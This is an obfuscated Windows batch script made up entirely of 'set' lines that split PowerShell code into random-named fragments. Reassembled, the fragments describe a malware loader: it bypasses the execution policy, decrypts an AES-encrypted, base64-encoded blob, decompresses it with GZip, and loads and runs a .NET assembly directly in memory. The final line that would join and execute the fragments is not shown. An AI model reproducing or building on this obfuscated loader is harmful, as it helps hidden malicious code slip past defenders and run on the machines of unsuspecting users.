@echo off
set "JPPrxJlgAH=\W"
set "qoqgjjbHok=Sy"
set "UoVPSxWvLV=rS"
set "VOXZvLxdCR=ow"
set "lzCFIDqjBm=in"
set "hMSTURTWil=s\"
set "GcztwGseVN=we"
set "QrNRTeilwC=xe"
set "YWDfuQwVHf=po"
set "MLdmuAyaSG=ll"
set "ropDonmgti=we"
set "leOSmwcviV=py"
set "lBUoXTDmEA=he"
set "lfIDBHxRQl=32"
set "VhQhvjlIur=0\"
set "KCusYeOnHP=y "
set "oAHKqvopDp=:\"
set "PgsZrHQIcx=1."
set "LgextMCdUX=Po"
set "bCtOoaQAYL=Wi"
set "CMYhEWmFfF=em"
set "PODhTNWGKU=ws"
set "XwCJYoOXkL=do"
set "uxAMtmFttD=st"
set "RhNHGhYiub=.e"
set "GJyHBQrepm=he"
set "kUaXRSIxKO=ll"
set "tnKwlgOpST= C"
set "JfyZwfbRPR=nd"
set "cfzuCQQaDS= /"
set "tLnbYKePTK=co"
set "KQXuLtZfhP=rs"
set "AQmCZwkpFV=\v"
set "ZNtdMJOEtU= %~dp0"
set "TtBexMHvgK=cd"
set "zxBNlLXXrY=$YtX"
set "pywYpbIKCW=ck($"
set "HpterJWCMI=[Sys"
set "McSjfaVCLz=PiDA"
set "dEECyOnrRP=rt]:"
set "TNNupmpEBA=CrBZ"
set "NayQBygCNw=raph"
set "ptkqXQpytB=6] -"
set "iljyKcXlUn=.Ass"
set "ZGfxfxbDfz=ZYYc"
set "HftLftvEmt=daeR"
set "jBYBnKWVRM=::De"
set "oHgGNbzqMZ=y.Ci"
set "DiJbByBUoD= New"
set "zkCymQmWaG=.Mem"
set "RpUCWSSMAD=]::C"
set "bkPelvxEiM=m.IO"
set "csYUCbyLQQ=embl"
set "ynlNzteUDP=pose"
set "mHPDHPyBaa=ress"
set "bqPNYJeRQq=Wq.I"
set "NijjpIBtdM='[-1"
set "HrEYTqQwhG='')("
set "FtucFzjqSS=bstr"
set "VcfJKtuBFR=OyzA"
set "vCgeUzRmjU=);$M"
set "ZmUMCBpViU=mory"
set "JBpJhWQyJp=y.Pa"
set "CafmxZMqwM=ewLi"
set "NcRKeNtjdX=-1.."
set "MLzeqPsciF=rity"
set "OZcvsmSuya=)($Y"
set "LYKJttXNTU=$LhB"
set "mzdakUNuAC=oCt "
set "dZsWyHnEgT=n ''"
set "wMNJNrMXGc=b, 0"
set "fJtxcbslJn=[IO."
set "NyoWEbjVfl=n ''"
set "VhPPUaUNQX=tXib"
set "QmUxLdogDk=.Cry"
set "RshllFgcMJ=New-"
set "dipFovfEyo=raph"
set "FeYycKWwbb= [Sy"
set "vFkEqSnWuu=i.En"
set "nsZjPkNzMM=;$Pi"
set "nUFPlVabdj=AjWq"
set "sOJzMsoNmr=UVjr"
set "FaiiPEaZVI=oCt."
set "iKVutAoJtu=Secu"
set "YTOYcbSJvA=);$f"
set "ZHgJiMLWVn= [st"
set "DbVyNRHUrc=S46e"
set "eczrOlQawQ=Syst"
set "TxQIUdXuuX=zz.D"
set "hFIPdcDypX=tem."
set "GvdDtIMVzf=and "
set "QjIESuDZaP=7Yiv"
set "uwYpKAQOMy=tem."
set "ThyJhbDCky==');"
set "EKKSeAaPRf=iron"
set "zGfaVBZPCH=z = "
set "lzMNWvAogR=FPyA"
set "UEIwBHLcBU=se()"
set "HGzOIciWlG=();$"
set "fgiObgqnDf=join"
set "gLKpJoeQiw=morF"
set "xFtzyugMtx=($tH"
set "HlWjRSQCnW=);$h"
set "pRAnXIVUxS=ddin"
set "IOwavkWQmJ=ment"
set "bsiZkHyPBp=eam("
set "KxmSnRpfEI=F'[-"
set "NrJXHpYDzJ=J) {"
set "UuNmDpezqV=rans"
set "raaXzhZPuX=[Sys"
set "fcycGUDlvq=sGUc"
set "hyFLqOCnVx=em.I"
set "fZavKMazFy=ss -"
set "WLdYGVpZHk=BZ.T"
set "bWnILeABTE=ing("
set "djKNPdHRxD=.IO."
set "dGRrXwWWeW=Secu"
set "WdkDqSMdFe=ress"
set "OJGHykLYki=]::N"
set "zCQpYmkeEK=trea"
set "rEtRMDxRBM=)))"
set "kmTGZjFoqy=AJ, "
set "QyQkJbLpmN=..-1"
set "EnYTwiDbRz=pher"
set "sVSzKvgAMB=ose("
set "hjnPbbpRnR=ert]"
set "AovDwKqeed=BaF "
set "hWpvBomjHg=rity"
set "TWpaaukOPR=Obje"
set "ZbNgiFOXog=DAJ."
set "HpYqqMzbqM=brea"
set "vmxQQoVEKX=em.C"
set "aufGbVTKcs=ose("
set "kGIjsNMGZA=UGTu"
set "xwXsJVyruw=YtXi"
set "OqTBAQfsGg=ct S"
set "RYHTydDSEv=6esa"
set "tXzgHCKNkY=.Len"
set "YtnBylSYAS=eEsl"
set "aXKzxhxlJZ=..-1"
set "yCpgfeDoub=1] -"
set "gKNgAvCodN=]::("
set "MKXKTipRcS=$PiD"
set "ymgktFhxkx=();$"
set "YTpMOpNMsm=yTo("
set "iYHrMiJbuC=$YtX"
set "EunPXTqNyd='gni"
set "shEoihNlwo=)) {"
set "FjzNtyLoYq=form"
set "kXaAuwulJY='txe"
set "zksRmzQAyX=k; }"
set "sdaBGUPVyr=v4Ir"
set "kBHrCyEcWR=+hAO"
set "PumpuUyzuA=[Env"
set "CrDhWrjcpZ=Stre"
set "DRkIkgUCMa=ionM"
set "LxyaBqJYlB=$fsm"
set "kZLaRHkjVZ=smzz"
set "RTgihtYSlz=('l0"
set "PjSnxAVyCP=BZ ="
set "xUlnGLAXwF=nirt"
set "HXsbIhJsJe= = $"
set "gafkkESvSY=ct S"
set "ukgmQDrKKx=tem."
set "IjVRSrPazV= = $"
set "waKkyzNQRP=m.Re"
set "tdOKjPsfai=yste"
set "uqrbKDXmOJ=bypa"
set "KyNHYThrFZ=.-16"
set "nmhUbznzkl=, $Y"
set "ROdppMZjut=$MAj"
set "cjydkcrAIR=ion."
set "wHTtrWoIEt=grap"
set "JALXHtufwj=pres"
set "yrKCYEaLOe=3); "
set "vejjcNKzbi=t.Su"
set "ivaMcjnigO=$hCr"
set "yjqGhpswWE=q.Pa"
set "tsEdUtnXna=flec"
set "tBkUVPihlP=.GZi"
set "dHXpmbJEFA=stem"
set "EmuNfxQEoR=($tH"
set "zjjICXdOnu=-4] "
set "khyVvxvtZI=aF.T"
set "KvvFScBoeJ=null"
set "fkddlXrkLJ=$hCr"
set "arxNMbMOKP=;$MB"
set "YJHpAHPHRN=e]::"
set "HTexHEnhIe=gnir"
set "ODefAjsqWN=orF'"
set "QYSwJoxjRu===')"
set "JpxSWXoVoL=::('"
set "jtYVUByRwS=pStr"
set "zqYEOKIAIv=oin "
set "UPoQjriDRO=;$Lh"
set "XGIJrFrWVa=ring"
set "awJURjGFux== $M"
set "ivheoYEPVE=V = "
set "daJlGAOFgt=bjec"
set "zotUgipibe= '')"
set "SstYuAsQcZ=-joi"
set "pTMtksteKZ=:('g"
set "QkUIlGMuqT=1..-"
set "AIfQfVgFMN=oArr"
set "ZBptrCAQID=AjWq"
set "YExfmaCtRt=FPyA"
set "QPNGNaypZB=ect "
set "zhtFMVgYDa=urit"
set "OfJBMuLIVQ=ispo"
set "afazhsFDxm=stem"
set "jXSOtSTxYQ=hy.A"
set "cIwsMPjQJW== [S"
set "cxpqVXBUUc=]::("
set "JXVHmMDHWS=g = "
set "PyDfWqkgUt=oint"
set "cgBnpKClkW=ay()"
set "mdEqRVCLHv=Bmor"
set "XtfOuxgtZZ=ateD"
set "EQUBotyWlg= = ["
set "FzkhenYTqy=ib ="
set "wcYUScDRKG=pose"
set "NrnDmxUPPm=ress"
set "yHLCmCDoZZ=.Cre"
set "PxmbnEBleU=Fo7l"
set "iBLvoYTyDv=comp"
set "mGQuMbTAHM=.Dis"
set "CuRauNCNcm=y]::"
set "MhuJKjXnZZ=YtXi"
set "ozwTOIpTXr=esaB"
set "UtLJEsLhIp=ptor"
set "pPBFoakKWM=vert"
set "bWLLwxxpNs=Syst"
set "PeFQKlZZHH=3HWs"
set "CdjASiqrPb=Obje"
set "IehKjQWNER=  $S"
set "loYDBHWoip=gMod"
set "CiphpzbFus=BC;$"
set "QMJGafUjkF=.Key"
set "bQYpyIrofK=join"
set "LDjthPQmaS=ecry"
set "gVQkqialSC= '')"
set "eLniWxkfvM=tryP"
set "bDOTplYSnp=comm"
set "YKxzmESrLG=Fina"
set "ADNlfQByMy=rJ ="
set "bEkLduCMiz=7;$M"
set "iowBgrlyge=lBlo"
set "YImLLUdcuT=fore"
set "BaNdPkXrlO=tS46"
set "EFnZPHETkY=.Mod"
set "KcgBEYSIYk=.Cry"
set "lKKgHDZVzp=AjWq"
set "crvQluMsVp=y.Cr"
set "KfpkHiigsS=('da"
set "pDtKwAqjGg=sli "
set "UoJazNJQBp= if "
set "HhcbtMoAwV=ke($"
set "dIoqpqVwPv=stem"
set "FYnEdazAMb=).Sp"
set "dhkSnAdsJh=-ep "
set "qtGWdzvnbM=Comp"
set "MjBAJDXNVi=esFX"
set "pxjdRvGQsQ=16] "
set "VxdOdpWXPM=;$Lh"
set "nzyyfsSIaa=[Sys"
set "bKpZQXzgUB=;$eE"
set "bNCOdWbfHa=Invo"
set "oKezIzZzHk=gth)"
set "UNXoamgeEb=HVP."
set "jgBSrnPJKP=, (,"
set "xjJedJFMiD=yste"
set "QHDTvusCDT=pDZz"
set "FsPKjgrEFF=ypto"
set "ECsYEuyczp=nage"
set "nqVlmnYoFs=[-1."
set "lIaBSnzmOn=.Com"
set "FaduHpOtgm=Disp"
set "NIxXhmOIBG=tion"
set "gTeWlIBkJo=tHoC"
set "XFPGVdpLxg=('%*'"
set "yaGEraHrAd=-Obj"
set "PesqzSnhEY=m(, "
set "wbcaYuJCug=oL'["
set "UXOKfQjnzQ=);$M"
set "TDXyZOvdnB=O.Me"
set "wdOdWJZrqt=J = "
set "GhrpRJsToO=$hCr"
set "baLWHXLcul='dqR"
set "YdWjJnWMUB=le  "
set "ifrZKDEdeF=ptog"
set "iVFjXhzbbQ=ode]"
set "wFORKqjboR=t Sy"
set "cubmsUDTjO=fsmz"
set "AtNKsjnIGe='[-1"
set "XMMTpvGYbq=Conv"
set "vNaXQBGjJg=[]] "
set "hniaAlKzjL=File"
set "EsOodOSsee=New-"
set "MfuOtWdguH=PKCS"
set "ktDUoaYmUj=ne);"
